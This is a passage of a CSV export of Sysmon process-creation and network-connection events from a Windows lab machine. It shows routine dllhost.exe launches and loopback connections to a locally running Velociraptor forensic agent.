 ""FileVersion"": ""10.0.19041.546 (WinBuild.160101.0800)"",
 ""Description"": ""COM Surrogate"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""dllhost.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\DllHost.exe\"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-66ca-280000000000}"",
 ""LogonId"": ""0x28CA66"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""Medium"",
 ""Hashes"": ""MD5=08EB78E5BE019DF044C26B14703BD1FA,SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10,IMPHASH=CF79FCE90FCED31836373F3E48251A5D"",
 ""ParentProcessGuid"": ""{6bc49a7d-7992-6a53-0d00-000000009a01}"",
 ""ParentProcessId"": ""904"",
 ""ParentImage"": ""C:\\Windows\\System32\\svchost.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783861038826,1,2026-07-12T12:56:38.9601861Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:56:27.059"",
 ""ProcessGuid"": ""{6bc49a7d-8efb-6a53-d505-000000009a01}"",
 ""ProcessId"": 11232,
 ""Image"": ""C:\\Windows\\System32\\dllhost.exe"",
 ""FileVersion"": ""10.0.19041.546 (WinBuild.160101.0800)"",
 ""Description"": ""COM Surrogate"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""dllhost.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\DllHost.exe\"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-66ca-280000000000}"",
 ""LogonId"": ""0x28CA66"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""Medium"",
 ""Hashes"": ""MD5=08EB78E5BE019DF044C26B14703BD1FA,SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10,IMPHASH=CF79FCE90FCED31836373F3E48251A5D"",
 ""ParentProcessGuid"": ""{6bc49a7d-7992-6a53-0d00-000000009a01}"",
 ""ParentProcessId"": ""904"",
 ""ParentImage"": ""C:\\Windows\\System32\\svchost.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783861038826,3,2026-07-12T12:57:01.7910085Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:57:12.851"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50685"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861038826,3,2026-07-12T12:57:01.7910271Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:57:12.859"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50686"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861144825,3,2026-07-12T12:58:04.6991708Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:58:16.881"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50690"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861144825,3,2026-07-12T12:58:04.6992034Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:58:16.889"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50691"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861144825,1,2026-07-12T12:59:16.455768Z,"{
 ""RuleName"": ""-"",
 ""UtcTime"": ""2026-07-12 12:59:01.259"",
 ""ProcessGuid"": ""{6bc49a7d-8f95-6a53-d605-000000009a01}"",
 ""ProcessId"": 1152,
 ""Image"": ""C:\\Windows\\System32\\dllhost.exe"",
 ""FileVersion"": ""10.0.19041.546 (WinBuild.160101.0800)"",
 ""Description"": ""COM Surrogate"",
 ""Product"": ""Microsoft® Windows® Operating System"",
 ""Company"": ""Microsoft Corporation"",
 ""OriginalFileName"": ""dllhost.exe"",
 ""CommandLine"": ""\""C:\\Windows\\system32\\DllHost.exe\"" /Processid:{4A616E61-3BFE-4F5C-937F-B8602BF16679}"",
 ""CurrentDirectory"": ""C:\\Windows\\system32\\"",
 ""User"": ""LT29\\seguridad"",
 ""LogonGuid"": ""{6bc49a7d-7a59-6a53-66ca-280000000000}"",
 ""LogonId"": ""0x28CA66"",
 ""TerminalSessionId"": ""1"",
 ""IntegrityLevel"": ""Medium"",
 ""Hashes"": ""MD5=08EB78E5BE019DF044C26B14703BD1FA,SHA256=E7FC40B41AA8B83841A0B96D169EAF0800AA784733E636935374D56536253F10,IMPHASH=CF79FCE90FCED31836373F3E48251A5D"",
 ""ParentProcessGuid"": ""{6bc49a7d-7992-6a53-0d00-000000009a01}"",
 ""ParentProcessId"": ""904"",
 ""ParentImage"": ""C:\\Windows\\System32\\svchost.exe"",
 ""ParentCommandLine"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch -p"",
 ""ParentUser"": ""NT AUTHORITY\\SYSTEM""
}",C.364907172793f8c7
1783861144825,3,2026-07-12T12:59:19.1400774Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:59:30.907"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50697"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
1783861144825,3,2026-07-12T12:59:19.1403471Z,"{
 ""RuleName"": ""Usermode"",
 ""UtcTime"": ""2026-07-12 12:59:30.927"",
 ""ProcessGuid"": ""{6bc49a7d-7cd5-6a53-7102-000000009a01}"",
 ""ProcessId"": 5276,
 ""Image"": ""C:\\Users\\seguridad\\Desktop\\TFM\\Velociraptor\\velociraptor-v0.75.6-windows-amd64.exe"",
 ""User"": ""LT29\\seguridad"",
 ""Protocol"": ""tcp"",
 ""Initiated"": ""false"",
 ""SourceIsIpv6"": ""true"",
 ""SourceIp"": ""0:0:0:0:0:0:0:1"",
 ""SourceHostname"": ""LT29.ait.us.es"",
 ""SourcePort"": ""50698"",
 ""SourcePortName"": ""-"",
 ""DestinationIsIpv6"": ""true"",
 ""DestinationIp"": ""0:0:0:0:0:0:0:1"",
 ""DestinationHostname"": ""LT29.ait.us.es"",
 ""DestinationPort"": ""8443"",
 ""DestinationPortName"": ""-""
}",C.364907172793f8c7
